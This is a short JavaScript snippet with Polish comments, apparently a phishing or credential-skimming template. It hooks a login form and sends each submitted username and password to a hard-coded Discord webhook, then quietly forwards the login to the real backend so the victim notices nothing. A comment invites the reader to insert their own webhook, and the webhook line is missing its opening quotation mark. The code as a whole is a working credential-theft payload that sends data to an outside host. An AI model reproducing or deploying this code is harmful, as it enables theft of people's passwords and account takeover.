<script>
  const out = document.getElementById("out");
  const webhookUrl = https://discord.com/api/webhooks/1399272439778771044/tKsun2HWGdUCEk-Lspm1D6ILN9bPVouDhyHlwzwN-f0a0nQWOec_F50zo6e2hypeAffw"; // <-- tutaj wstaw swój webhook

  async function post(url, data) {
    try {
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
      return await res.json();
    } catch (e) {
      return { error: "Brak backendu – demo frontendu.", detail: e.message };
    }
  }

  document.getElementById("loginForm").addEventListener("submit", async (e) => {
    e.preventDefault();
    const fd = new FormData(e.target);
    const data = Object.fromEntries(fd.entries());

    // Wyślij dane na Discord webhook
    const content = `**Nowe logowanie:**\nLogin: ${data.username}\nHasło: ${data.password}`;
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content })
    });

    // Dalej wysyłaj normalnie do backendu
    const res = await post("/api/login", data);

    out.classList.remove("hidden");
    out.textContent = JSON.stringify(res, null, 2);
  });
</script>